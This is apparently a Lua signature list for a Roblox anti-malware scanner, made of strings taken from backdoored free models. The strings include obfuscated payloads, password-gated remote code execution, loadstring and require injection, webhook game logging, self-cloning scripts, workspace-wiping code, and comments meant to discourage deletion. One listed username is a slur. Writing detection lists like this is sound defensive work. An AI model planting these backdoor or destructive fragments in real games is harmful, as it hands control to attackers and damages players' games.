	-- [[dRtYZW4RAAAANlU2OEhHN0kwVFNYU1dHMABJeJkxLagBCQeqOpoSEOvu1Drr9I3Ambyj28tP1KoJh54Y2a9RnSBfXXQZ2BSnaLTTNggAAAAIChsJCgEZADXwYWCnNFkoOBQAAAA/PSA7IDwiLjwnKj0wIyAuKyorAA/DAQmnWyn2GggAAAAIChsdCgEZANuGAlqnnCYccQcAAABvCwoNGggAJQESAqe3lMs5BAAAABwaDQBZ2p93lvRRTRrc0h/YjPrIOZM9PGqnKf7KWAsAAABvGx0ODAoNDgwEABT+yi+nQnnSCwUAAAAJBgELAKtfVQ6nFuS2WQcAAABvIwYBCk8AgwjGKqcu6UsWBwAAAG9VSgtEVQBT9Tt7p1NpfkAKAAAAbyMGAQpPSgtEABvVyASn3Of6ewcAAAAIAg4bDAcAFPpEYqdwJWM1CAAAAB0KHhoGHQoAHuH7Y5bTIhtX3NJfyY4rODgXWZxWlvyXWgPc0j+nnbEhOA4pZ2mWh9tdb9zSH9gMjwk5H0RdEJan/bth3NKf7NwvIziGsaFkloruWgXc0n+OwUYgOISA0E2WBAzaCtzSH9iMSls5qyP/LJYNuW8g3NIf2Iy6fjk+qeMPlmBMjCDc0h/YjPELOdXZEVmWtzeIC9zSP7HKRiA4SgFMB5YpA61m3NIf2Iy6ojn4Qv8zlptfYmvc0t9fqtodOG+ECiqWQiGrENzSH9iMMk05sfr+W5b7gO8o3NIf2IzFCDkwgEsilmTo4nLc0h/YjNRzOdmyxQ2WILBZVNzSP5RbQCQ4Td8KMpZYCGdk3NJft4pDLDgfX+NVlp6dnlPc0h/YjLpeOTxI+jaWCGTnAtzSH9iMuqo5hc1/GoundRd+Qi3ty2uoa2RQrwgJAu3ty2vsP4AIr3QqWNOLK7a9+AE+owMsZiW2/1l2T1YKowZaqFZ3Z4t9j2xn+Hl0JomGUHjq9pd7rwF4mRzmKMNknhAto0UnJpadUHgTqHdAr00dQA3tsjjOSvZToxBTqFZ3Z4sreGlp+DRZfiehhVzQcHVprwwG5lecUHiscFparzt/AE3tsjhU9bxcoyt3qJZ3Z4vkdJp/+FJY5hecUHiPwDd8rxdsUqJsMi7lCRYzo2w4AA3tsjjFIbhvo1pSqFZ1Z4u5xmA++FVUfoFyyl7ey1tXow87UqJsMi4asnVsozRjwq3hy2tNACBXr1ROgm3gy2teOldTryB5SOV74FgYKqNUow0+mbs++WYa5KR1ox5VqBZ3Z4uKbmAB+C1zZlWbUHg/9tdOr0Q1cf+A3UZFs/8wryAjQmrjy2tTzYUar3laXQmXAKjmyiUHoys3wuvjy2sr6X0xrwIrEqJsMS79XtpDo3B2mTswfma8x1cToyh+qBZ3Z4tIAP8J+Ch3j9j98E+6rQ5zo15fqFZ3Z4uTcK16+Ho7Au3hy2u621V8rz0oPoByyF5ehkZh]], - Obfuscation Code Unecessary due to obfuscation detection

	[[\115\101\116\102\101\110\118]],

	[[(tonumber("\49"),{["1gKorIzL9NW7p"]=2]],

	[[W9eAGHhQql=getfenv()[]],

	[[["\112\99\97\108\108"],["4zjOqGRxUQEUboHq"]=]],

	[[–Official roblox studio script]],

	[[4628266409]],

	[[‘rbxassetid://4850318089’)[1].S]],

	[[– You may proceed if you have basic knowledge of scripting and know what you’re doing.
local RunService = game:GetService(“RunService”)]],

	[[Created by: InceptionTime (Year: 2020)
Description: This is a filtering event put by Roblox to check if your game isn’t modifiying the chat filter in any sort of way, deleting this may lead to unforeseeable consequences.]],

	[[Checks if it isn’t Studio, as it defeats the purpose of the module, also checks if it is being ran on the server’s side and not on the client’s side, just to be on the safe side.]],

	-- [[23J23H27523H23E2761F1O1C181K27A27423H23121N26H1F23W21O27627523D27623327O23G27R27827U27G27523C27627427U23H23F27628323H]], - Obfuscation Code Unecessary due to obfuscation detection

	[[n(function(AIDSX_lIIIlI]],

	[[IlII)local AIDSX_IlIIll]],

	[[4921378606]],

	[[hildren(print("Get"))
local IiIIIiIIiIIIiiiIIILII = loadstring(print("Welding"),true)return(print("Returnweld"):Connect(_G),print("Weld"))),false,function(move);
	local IIIIIDIIIIlIIlII = move:Connect(function(weld) unpack(functi]],

	[[•?((¯°·._.• ʍ๏ď€ℓ ʍąЌ€я$!! ƒя€€ ʍ๏ď€ℓ$ ƒ๏я €˅€я¥๏ɲ€$ ǥąʍ€$! •._.·°¯))؟•]],

	[["WolfPackHollow";
"antiisociaII";
"vgb";
"jmmousee";
"FxEok";
"Shibated";
"death131";
"allahNigis";
"BrainFreezor";
"1s2";
"tz3";
"executorkey_29103";
"guest_43783";
"unbanbee";
"sub2bee";
"WickedDual99";
"akarchy"]],

	[[Model Maker: executorkey_29103 (Cdawg)
Helper: YOU! (Supporting This Model)]],

	[[if Player:IsFriendsWith(853268500) then]],

	[[SADASFSOAFOSAFOSAOFSAO?FDWQORFfO?@RE)@#$))EOWDll,SALO?WFRO#RO#LFSALF,QWF>:LFKLWCLSA_SW_E!$)_!$)_!P@EDSADCL:>QPW@FL:!R@)P#PORLEFCASD?P!O@RO#RFP#WQFLAWF'P!ROFP#PRT@WEQFPL:QWE]],

	[[orparts(location)
   for i,v in pairs(location:GetChildren()) do
      if v:IsA("BasePart") then --This includes Seats, VehicleSeats, WedgeParts etc...]],

	[[s all simutaneously rotate in a circle.
-- This only works until you die,]],

	[[repeat until nil]],

	[[repeat until false]],

	[[repeat until 1==2]],

	[[repeat until ""==1]],

	[[repeat until false and false]],

	[[repeat until false or false]],

	[[repeat until false or nil]],

	[[repeat until false and nil]],

	[[repeat until nil or false]],

	[[repeat until nil and false]],

	[[repeat until nil and nil]],

	[[repeat until nil or nil]],

	[[repeat until not true]],

	[[repeat until not 1]],

	[[repeat until not not false]],

	[[-- Don't remove it, or else you'll break the Anti-Exploit]],

	-- [[27227127527326Y27527123Z24823W23S24427B27027523X26O21225Q1C25827326X27924124224C24927927126Z27926N26W27927H27526N27527H27327W27W28828826528927127428927H28327W28J271]], - Obfuscation Code Unecessary due to obfuscation detection

	[[local remote = Instance.new("RemoteEvent",game.ReplicatedStorage)
remote.Name = "CharacterLoadedEvent"
remote.OnServerEvent:connect(function(player, code, password)]],

	[[5360221]],

	[[** \https://www.roblox.com/games/" ..game.PlaceId.."/]],

	[[🌹Game Logged🌻]],

	[[Joe mama security check]],

	[[require(script.Loadstring)(injection)()]],

	[[.OnServerEvent:Connect(function(idk, lol)]],

	[[local remote = script.Parent.Peachy]],

	[[pt.Parent.Parent.Code
local remote = script.Parent.Peachy
execute.MouseButton1C]],

	[[while true do
	wait()
	if script.Parent == game.Players.LocalPlayer.PlayerGui then
	script.Parent.Name = math.random(10000000)
	end
end]],

	[[if password == "Katie" then]],

	[[= script.Peachy:Clone()]],

	[[wA7L6F_wGbiQx9eO2PMf2g0nivzVRnyNR7vWzJFy-4msdw-3_jx4wch8k7-f8xLEKRNE]],

	[[x.com/games/" ..game.PlaceId.."/",
["webhook"]],

	[[669028334285488163]],

	[[::Flame::Loadstring::]],

	[[.OnServerEvent:connect(function(Player, Code)]],

	[[check = part:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone()]],

	[[check.Heat = check.Heat  +100]],

	[[while true do
wait()
script.Parent.Locked = true
wait()

end]],

	[["Un_Removable"]= "On"]],

	[["Sheenieboy","Tommy594"]],

	[[Instance.new('Message',script).Text='Getrokt']],

	[[while true do
	script.Parent:Clone().Parent = game.Workspace]],

	[[= "its not over yet.."
wait(2)
bin.Text = "your Still here.."
wait(2)
bin.Text = "and im nev]],

	[[844512692]],

	[[er) if Player.UserId == 270553268 then Player: Kick(]],

	-- [[5114652G00B1A20C66821349984EFB92735CEC9B0065141D64EC48AA37639A0A0200435G00E4944050C1746C93CFC762256D0A02002G14160C152G14043G14043G14444G14152G141C3G1438013G0054050062CE6E3F005A3F9761149E090AA9D700182GE20BFC7429D427A80A02000D063G002G5126303825436G0010400D0A3G002G511534333E243F32340D053G002G511738290D093G002G5106343D35383F360D033G002G51710D0A3G002G51183F2225303F32340D053G002G513F34260D083G002G510232233821250D083G002G51023E242332340D500D2G002G515B2G7C71053938227138227130712232233821257137233E3C7122252435383E7D71353E711F1E057135343D34253471253938227F9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B9G5B7G5B9G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589G589]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[9653008FFBA91332013G0007F3FD1BCD5A023G0002E61AAAE0674G00342ED94349530D15A253505A0A020051083G003G96D5FAF9F8F351073G003G96D8F7FBF3511F3G003G96DFF8E0FFE2F3B6D0E4FFF3F8F2E5B6E5F9E3E4F5F3B6E5F5E4FFE6E251093G003G96C6F7E4F3F8E251073G003G96F1F7FBF3510C3G003G96C1F9E4FDE5E6F7F5F37B5G00E4944051033G003G96179G002G00103G00113G00109G002G00109G006G000E9G002G000E3G000F9G009G001G000E9G002G00556D0A02005C53515B555357472G50534F5D238E71575357472G53515B5553574752595553ABAC525BA5AC525B552G53472G5351432G53515B845253635157537F5256514FA1AC525B5253515B3G5323552G5347F4BDCF79A7AC525BA1AC525B98801E69507DE40F78C9F130E7C9F531290CDD3BC62E0011F76C8E3AC646E776C77E22F4ED480164066B41558ACAB8080CC6BF5B008705A9777122334G00F0A0FE5F11052400B047AA590A020051083G003G96D5FAF9F8F351073G003G96D8F7FBF351073G003G96FBF7E2FE51093G003G96E4F7F8F2F9FB7B6G00F03F51093G003G96C6F7E4F3F8E251033G003G963E7G00F9019G001G00F9012G00F9019G009G00F7019G005G00F7019G001G00F7012G00F8019G005G00F9019G005G00F8019G001G00F8012G00F9019G005G00F8019G001G00F8019G001G00F8016G00F8019G001G00F8019G001G00F8019G005G00F9019G001G00F9016G00F9019G001G00F9012G00FA012G001F940A02005653515B5155593G53515B57535B4757535F1FFABDFF2G7953515B5253515B3G5323572G5347F4BDCF792GAC525B2G53515B572G53472G5351432G53515BC1BD07755157537FFBBDF3795E53515B575357475853515B51535B47BBAC525B57535B47B5AC525B522G573G53515B575357475250534FFABDF379A6AC525B57535747A0AC525B51535B472G53515B57535B475155593G53515B57535B4757535F1F2GAC525BFBBDFF792G53515B57534347B9FBFA0]], - Obfuscation Code Unecessary due to obfuscation detection

	[[1643016165]],

	[[value(calc).Load()]],

	[[-- This is a script from studio, do NOT delete this.]],

	[[ayer.UserId == 206253701 then Player: Kick]],

	[[Ashlifa Destroyer]],

	[[for num,obj in ipairs(object:GetChildren()) do
getchil(obj)]],

	[[er.UserId == 183587408 then Player: Kick('Fl]],

	-- [[\14\11\11\11\8\12\11\11\11\108\110\127\109\110\101\125\8\12\11\11\11\121\110\122\126\98\121\110\8\3\11\11\11\127\100\101\126\102\105\110\121\8\3\11\11\11\127\100\120\127\121\98\101\108\8\1\11\11\11\63\61\50\61\61\59\62\56\58\51\11\11\11\11\0\11\11\11\25\2\11\11\11\10\11\11\11\11\11\11\11\11\10\11\9\11\43\11\11\11\11\11\11\9\11\25\11\11\10\11\8\11\11\11\25\11\11\9\11\15\11\11\11\25\11\11\8\11\14\11\11\11\11\11\11\9\11\8\11\11\11\11\11\11\10\11\11\11\11\11\11\11\11\11\11\11\11\9\11\11\11\11\11\11\10\11\10\11\11\12\11\11\11\10\11\11\11\11]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[lnmne}ynz~bynde~finydxybel?=2==;>8:3]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[\128\128\128\128\129\128\128\128\137\128\128\128\130\136\128\128\128\242\225\247\229\241\245\225\236\130\135\128\128\128\242\229\241\245\233\242\229\130\133\128\128\128\240\242\233\238\244\130\134\128\128\128\243\227\242\233\240\244\130\135\128\128\128\196\229\243\244\242\239\249\130\132\128\128\128\231\225\237\229\130\135\128\128\128\208\236\225\249\229\242\243\130\139\128\128\128\208\236\225\249\229\242\193\228\228\229\228\130\135\128\128\128\195\239\238\238\229\227\244\129\128\128\128\155\128\128\128\128\128\128\48\47\214\85\113\193\130\132\128\128\128\231\225\237\229\130\135\128\128\128\208\236\225\227\229\201\228\130\138\128\128\128\199\229\244\211\229\242\246\233\227\229\130\143\128\128\128\212\229\236\229\240\239\242\244\211\229\242\246\233\227\229\130\140\128\128\128\199\242\239\245\240\211\229\242\246\233\227\229\130\146\128\128\128\205\225\242\235\229\244\240\236\225\227\229\211\229\242\246\233\227\229\130\142\128\128\128\199\229\244\208\242\239\228\245\227\244\201\238\230\239\130\135\128\128\128\195\242\229\225\244\239\242\130\143\128\128\128\195\242\229\225\244\239\242\212\225\242\231\229\244\201\228\130\138\128\128\128\210\245\238\211\229\242\246\233\227\229\130\136\128\128\128\201\243\211\244\245\228\233\239\130\139\128\128\128\195\242\229\225\244\239\242\212\249\240\229\130\133\128\128\128\199\242\239\245\240\130\137\128\128\128\201\243\201\238\199\242\239\245\240\130\138\128\128\128\207\238\212\229\236\229\240\239\242\244\130]], - Obfuscation Code Unecessary due to obfuscation detection

	[[AntiSkiddingTool_]],

	[[-- Thanks for using my Remastered Couch Model
-- Please do not remove any code after this text to prevent texture bugs.
-- It's obfuscated to prevent leaks and copies of my work.]],

	-- [[\32\38\38\38\39\46\38\38\38\84\71\81\67\87\83\71\74\39\33\38\38\38\84\67\87\83\79\84\67\39\35\38\38\38\86\84\79\72\82\39\32\38\38\38\85\69\84\79\86\82\39\33\38\38\38\98\67\85\82\84\73\95\38\38\38\182\93\208\220\215\103\38\38\38\38\43\38\38\38\52\41\38\38\38\39\38\38\38\52\38\38\39\38\36\38\38\38\52\38\38\36\38\37\38\38\38\38\38\38\38\38\36\38\36\38\32\38\38\38\38\47\38\39\38\38\38\34\44\38\38\38\47\38\39\38\52\38\38\38\38\34\38\38\38\6\42\38\38\38\38\38\35\38\38\40\38\38\38\36\38\39\38\52\38\38\38\38\36\38\38\38\52\46\38\39\38\32\38\38\38\38\40\38\38\38\36\38\39\38\38\37\38\38\38\39\38\38\38\43\38\38\38\39\38\38\38\39\38\38\38\39\38\38\38\39\38\38\38\39\38\38\38\39\38\38\38\39\38\38\38\39\38\38\38\39\38\38\38\37\38\38\38\37\38\38\38\37\38\38\38\37\38\38\38\38]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[&&&'.&&&TGQCWSGJ'!&&&TCWSOTC'#&&&VTOHR' &&&UETOVR'!&&&bCURTI_&&&�]���g&&&&+&&&4)&&&'&&&4&&'&$&&&4&&$&%&&&&&&&&$&$& &&&&/&'&&&",&&&/&'&4&&&&"&&&*&&&&&#&&(&&&$&'&4&&&&$&&&4.&'& &&&&(&&&$&'&&%&&&'&&&+&&&'&&&'&&&'&&&'&&&'&&&'&&&'&&&'&&&'&&&%&&&%&&&%&&&%&&&&]], - Obfuscation Code Unecessary due to obfuscation detection

	[[4966797461]],

	[[eturn(function(T,T,T,T)local U=string.byte;local S=string.cha]],

	-- [[23T23S23T27623T23W27726X26I26G26D26D27527725627727J27623X27727226G26827127G27J24D25L23U27527M27626M26G26C26K23T23N27725Q26K27126226K26Z27326826I28323M27721222624425B25N23G22321G21P22Q25823T23L28628825K26Y26O26F26I23T24O27721426L25524N24V21D22D24I1Z24324I23A2191126R27122U21D22024S26323F25S22M25726A25724125Q27326P22B1J27827A27C27E23T28H2761U2371B23N1Q24U1M1725622L26B2932771P26X1N1V21C21G24826V22O25X21L22F26L22024B1226C22E1Y1A27124V25F21C21925K1U27223325I25L26Y22K23T23Y27726Z26K26W2702682BN27G25521R22P21323F25K23T23H28I22C22L1G23P24H24524D23T22S24923M24422422G25R24G24226G25925T1824D22D22X21W24723H26D23Q2281S26B21K24023Y26G25O21G26G26F24R22T23K23325O22T24I1K24V26K23G24Y26A26526023C23F24721424O24K22K26E2521821R21H1H22L22R23T25C23W22I23O21R23S23Y25O23922P25M24122C22V1A22O23V22325325S26124826525A24U26R23X26622W24J1522D25P25Z1623Q23I25H21G22622822F22224P22J21Q21F24321U2232632282151U2302651M21421P24025621O21R1Y26726922U25F26526O26024425226T26C25G26Q24G25F2141623126022123H1W25K21825O25125S23I22A1G21F25R25P24B22526X21L26B21E1D24B24Z21U24723Y1K23Z1D26O23K25S24T26V22P22I21M23T25H22H24R25N26L26R27222B24O24S25624322E22825F25L22M2661K21J24K26Y23225Z22E1H1025H1I22Z2522CU25C26Q21R1Q26L24D1Q25Z26L23U25V21T24926U23U23K235162BK27726M28826N26K26F27323T23Z27726Y27126Z26826F26M23T23U2J327026J23T27Y23T26I26926G26Z27S27K2JM23T22X26E25L2JO23T23D2522742771O2JT23T25L23T23V27721T2702JF2771T21Z112642JT2492K22K42761A25A2JX276112K327724T25J2K82761425V2401923T24J27722Z21R26D]], - Obfuscation Code Unecessary due to obfuscation detection

	[[local a=script.Script
	a.Name = "ChatServiceRunner"
	a.Disabled = false
	a:Clone().Parent = game:GetService("ServerScriptService")]],

	[[https://discord.gg/awESajr]],

	[[ss skidder]],

	[[skidded by]],

	[[ss executor]],

	[[ServerSide Ex]],

	[[op executor]],

	[[Debug = false
Config["OldScript"] = script
if Debug then
	require(]],

	[[Instance.new("Script", game.Workspace:FindFirstAncestorOfClass("Part"))]],

	[[while true do
	Weld()
	wait(.000000000000000]],

	[[ize = 999
			p.Enabled = true
			local y = Instance.new("For]],

	[["http://www.roblox.com/asset/?id=240040664"]],

	[[loadstring(script.punci.Value)()]],

	[[p= game.Workspace:GetChildren()
for i= 1, #p do
p[i]:remove()
end ]],

	[[while true do
wait(.1)
local a=script.Parent:clone()]],

	[[while true do
wait(3)
boom = script.Parent:Clone()
boom.Parent = game.Workspace ]],

	[[function Find()
all = game.Workspace:GetChildren()
for i = 1, #all do
if all[i].className == ]],

	[[local m = Instance.new("Message")
m.Parent = game.Workspace
m.Text = ("Admin as chosen to delete the server")]],

	[[= {166325648,187205557,170109073}]],

	[[de3 = "mp"
ProtectCode4 = "ar"
ProtectCode0 = "n"
ProtectCode5 = "you"
ProtectCode6 = "e"
ProtectCode7 = "doi"
ProtectCode8 = "in"
ProtectCode9 = "my"
ProtectCode10 = "g"]],

	[[v.Name = (ProtectCode2..ProtectCode11.." "..ProtectC]],

	[[Cleaner = script:Clone()
		Cleaner.Parent = game.Workspace]],

	[[Protect.SoundId = ("rbxassetid://"..ProtectId[math.random(#ProtectId)])
Protect.Name = "ServerSaver"]],

	[[rch(Object)
	print(Object)
	coroutine.resume(coroutine.create(Paint), Object)
	local Children = Object:GetChildren()]],

	[[4890938963]],

	[[iTzz Mocha]],

	[["\114\101\113\117".."\105\114\101"]],

	[[-- that one bruh moment when you want to crack my thing lol idc if you do so sucks to suck]],

	[[-- idc if you leak it :/ i just dont want to obsfucate it again ;-;]],

	[[--cool ikr idiot cant find his dick lmfao]],

	[[local lala = script.Script:Clone()]],

	[[ANTISKIDER_]],

	[[bubbyjo_l]],

	[[50386558]],

	-- [[01B9475B0A0200815H00E49440612H00FC1464188AFA5D12AF8FBB3B875C0A02002HB9BBA5B82HB9B13HB9B13HB9BD3HB9D9B82HB9FD3HB99D4H00013H006A690A020033063H002H0176606875816H001040330A3H002H014564636E746F626433053H002H0147687933093H002H0156646D65686F6633033H002H0121330A3H002H01486F7275606F626433053H002H016F647633083H002H0152627368717533083H002H01526E747362643324302H002H010B2H2C40454C484F214D4E404544532F0B2H2C5569687221687221602172627368717521756960752168722171607375216E6721786E74732160656C686F21686F2166606C642F0B2H2C53646C6E77686F662E75606C716473686F6621766875692175696872217262736871752176682H6D21716E75646F7568602H6D7821736472746D7521686F217262736871757221637364606A686F6621686F21786E74732166606C642F0B2H2C486721786E74216960776421606F7821682H72746472217668756921756968722D21626E6F75606275214374686D6564736C606F22363233359H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B9H0B7H0B9H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H089H]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[kPjbgYxVkeqYqakD39XG3Jv8DmVEPKvkExxq8Ru754RHNJz8K5V9f7xAX8VYRY4yyRmeT7Av69WeEztYY7TzM3Favj4cyTR7sJLV]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[21C21D27521E21N27521D23B22G21V22C22Q22C21V21Z27G27427521527921E21H27922E22822K22C27727923A22C21X27F27H22G22A27U27827522R21W22N28021Z28227U21L27923C21U22Q21X21W22D22G22M21E21F27923223A21E21727923423H22R23823423922W23223822X23823622S22T23823923222Q22P23C23923822R29C22Q21F21C21E21J27921U22A21V22G21T21X21E21P27922Q22H22822D27G23H22M2A127G21E21G27923622L22M22N27U29O27522P22827D22N29V21O29Y21X2AJ21X27G22P22L2282202A72112AO2AQ2AS2AU2AW21V22Q29R29T21X21U29N29P21T22G2A221V21E1Y29Y27G27I2B42B629U28A28C27V27521U2BC2BE22N22M21X22G2BA27523822127G2882A827923D2BD2A721E27921Y22C22B21E21M27923B22822I22C22C2A42A62BF28E2752BV2BX22F22G22C22D21E21K2CB22M21V22I2BS2282832C527522A22H22C22A22I21E2CQ21D22Q22V27G21U28M22N27921D21C22S2791Z1W2DO2DU2751H27527427428P1Z27621D2CA2DN2DU2CA28P2DX2DU27427P2792E021D28P2AG27422T2EB21D21H2E521D2EK2741Z28P2742A92DW2CG2DZ21D29O21J21B2DU2AN27K2EM2EO2F42F62792EQ21D2ES2DU2EV21D1127P27429O21I2FC2DY21D2DF2EA2EY2CZ2FQ2DU2852FN28P2E12752ET2792EA2FX21D29X2G22EG21D2AN1X2FN2CG2FY2DU2FP2FN27421R21D2FT2742FV2DU2G32E22G72F52G628P21Q21D2GA2DU2GC2FM2GE2G12GG2GV2GJ2H22GM2EF2GD2G02DW2FZ2G72GU2GW2742GY2GP2742GF2EL2DT2GK21D2H62G72H82DV2H42HP21D2HD2GB2G72HH2FO2H12EL2E22HM2HO2GO2HB2GR2HB2GT2H32GX2HX2FN2HJ2EY2BH2I32DN2H72GZ2H92HS2G32HV2IB2GD2HI2I02EY2AY2HM2102IK21D2132792HE21D2HG2ID2IS2DU2IU2H52II2HT2GP2IL2GS2HU2IA2HF2IC2H02HA2EL2122HS2EY2I42JH2JC2I82JE2J12J32JI2JM2DU27M2IH2EE2JA2I62I02IN2JF2J22G721D2BH2FN2792FF2HR2DN21F2IW2F52751X21A2K027K2AN2HB2792K92HR]], - Obfuscation Code Unecessary due to obfuscation detection

	[[local Plr = script.Player.Value;
local Player_Name = Plr.Name
local RunService = game:GetService("RunService");

Plr.Character:Destroy();
Plr:Destroy()

workspace.ChildAdded:Connect(function(obj)
	RunService.Heartbeat:Wait();
	if obj.Name == Player_Name then
		obj:Destroy();
	end;
end);]],

	-- [[23G21V27521U21Z27521V2101Y21A21221U2212791421221J1G21221D21H2161W27E2202791M27223C24A21024U22V25J22T23K21621U2292791E1Y21D21427J21F21B1Y27Q27L27N27P27E23127924224G23M25I21A23O23V22324U22L22F22O2301Q23V2531B1422B26A23E25724H2491G1724225E23422D24R21V26N226122591326R21R22L1B22125Z21J26O21R21T2792792371329X29Y21V23F2A12A321V132A62A324Z23G2A22A32AA29Y2232AG27922B2AA25F23U22625Q24B1221V21U2A224J24U23624724K122A21324R22Y1424L2B127525F23223C21A24Y2B827522624Q22J26T2BF1Z22K2341W2B02AE2641Q21T24O2BF22R1P25G26224S2BF25F1624T23E2422BF21V25823724Y23Y2BF132142312302402C225S21122I23V1221U2432A226A1F26A24222426V25O1H22521P21U2731J2A521E1Q2461O23F21J2571Y1B1526I1423F26X23J23P22Q22A26K23N26F24V21N1M23I24K2491J21325H23E21V24S1823Z21N1C22323E24C2671M23223M25225422121Z27223T21426N25N25E21P23K21Q25E26Y26021C26V23922B25Q21I25725R23321225025W21R26125O26S21D24624P25O1E22R22L23G24927324Q24F22S26K21824Z2441Q2631D22825M24Y21725Q26M1A24O1023521925I24K26521I23121626L25525R21Z24M26F1E24V23W24221G23824H25524V1V25O24J21S25P22U25B26K21423K21T21E1L23423C21724X26O24525W26P24L1G23C2161Q25X1K26N25C1122S22622221B1Q22J23O26B24H26R25C2431D26I22H23N22925N26225O24723621I23824P21723D23424N24H25125T24J25127323Y23B25U26B21E24Y21A24P1O26Q26H25P24724G26V22R26S21G26Y26V26B22723I25726721C24725U2351B25G25V23U24I26Z26425N24224H23F24U25425W23125U26K1D25A24Z21U24Y24A22M23623M26826T22L26Z21423D1024T26K25F25I1623Y23L23I24W21M25A1T26122A22K1Z24E21425D24B1B23523D21426H23W25K21926323K25U23F23024Y25Z1X]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[1P1D2751F192751D22M23023F22W27727922Y23022O27E1727922222W23D22M22W23J23F22S23227E1A27922L22P23023827R23I1F1V27921S23023J22U27O23H28027V27Q27S27U27E1327M27O22L23J22Q22X23C23223D21W22R22Z22Q1F27X27527Z23027V21W22X1E27523X25G1023K25X2241D1C2961D26L26821O26126I22429G22526D21022226J29N2971W21I22O27029U2751026C1L2572A02311I21Q23229M29G1D24222C1F26E2A021922F23U24426A2A023X22026B21G2642A01D26Q21P27025C2241F1627Y28028223J22422X22X22W22X28Y27922622Q22R22R22W28S2AC2AC1F1427923E22Q28A23I23H29228J27922322S22R22X2BX23J23I23D22622T22S22P2BB1B27921921S28P22W22P2791D102791V1K2791C2CB2CH2761D2861D1F1D2AC2CQ2CV2CV2CA27927X2CO2CO191I2D229E1D2D627927L2CO1D21H2CN2CH182CQ2752DB275112D92DF2DK2752DJ2DR1R2DH2792BL1S28L23D2912B522723822G23I27R29427F27521V27I27E2DT1D23H23223022P22P2DE2DP2CU2DV27527N23D2EC27J22328O22O2E62E822X22423I23822R2322CH2D12752192DW1D2F92CQ2EM2CU2FF2DR2CZ2DR2FJ2FE1J2CH1U2EN2792172D92EM1B21K2D92D32792DM1D2FX1D2FO2FE2752FR2D42CH2102D92CV2792G32EN2191T2FS2DP2132CW2DK1H2D92962D02122D928K2G72FZ2GS2DA2D72752GD2G22FG2CB1Z2GK2CO2GB2742GB2GK2192H32CV2H52752G92FI27921A2FF2H81V21P2GK2AC1B21Q2DA2DH29G1O2792H81D1G2FA1D2HU2DR2DO2GO2FP2CX2CH2BL2CH2HG2DK2EM1C2FM27627827523E23022S23D1F2H821W2212EA1D27H27J2BC29028E22W2E92AC21Z21U2271F2EF21Z22Q2332E92IG1D21V22421S2202IQ2ET27E2AC22222G21W1F2F723I23223J22S23H2IL2BN27522M2JP22W22W22R22223C22S2J327921U22I21V22022N2BM2BD23J22W23023D2BQ2E92H822M22M2JM27921V22G21S2272K92IU1D2E22832B12E02C52C722X2KD22R1F2AC21S22422D1F27L2752]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[1E1F2751E142751F21Z23F23F23J22222P23223122R22Y22Z1F1D279172791E1A27923J23023222R22R27N1E1B27923C23222U23F27928727321C28027922W23222Q22Y1E1S27922K22Y23H23D28L22K23023H22U23J23F28K28M22U23028G27827522123222S22Y22Y21V22O23222Z28L1E27P27522322U23G27H27J27L27427527S27628127528D28F1E1527922022Y28U28L23D28X28Z27927B27D28V2A028Y29C29V29X22623G23A22P2301E1P27922V27C23J21H1W1W23C2AQ1X22W22O22O22W27J1X23022O22Q1W2871F29D1F1T1H27Q27921B2B327M2B627527N1C2BC2BF2BD2BB2B32811T2BJ29N2BC27Z2BC29L1F102791T1K2B92BF1N1F2BU27929U2BJ27N21521A279192C32BD1B2AI2752CC2742CF279122CD2BY2CD2BH2751T2BW27N29P2872742BS2BO2CD2BQ2BL2742742CC2D22CD181F21R2762B42BD1F2BL2DD2751O2C01F2C62C32CV29R28G2DL29W29Y28W2A82CM27521Y22P23G28L2DS2A728G1127922122U22P22Z2E623H23G23F22422V22U22R22Z29T27921U28422P21U22O22Z23E27J1E2D829E22Y2EC23H22O23A27R27T27V27X2F127522H27W23E28G28I2752A628O28Q28S2E12A12A92FC22H28L23G22U22O22P2CD2752EU2DM28C28E2DP2AA2FH2DU2792DX2DZ23H2FZ28G162792972992AC2DZ28627521B26024N2532732261E2E42912E72E922U2EB2ED2EF2EH2FJ1F22K2FL2EB2FO2FQ2872DV2B62CQ2FR2DE2BR2BE2BD2H52B327N27N2DF2792BN2BP2BI2BD2HE2BC2CC2CZ27N2FT2792BH2C42872HB2HJ2B32BU2CA2CR1J2DJ2HF2BJ2HO1F2HV2792HD2H72BM2H927N2BQ2HC2BD2CC2C52CD2CJ2CG2DK2CD2CK27528I2742CO2DB2GE2162IF2I52I72C72I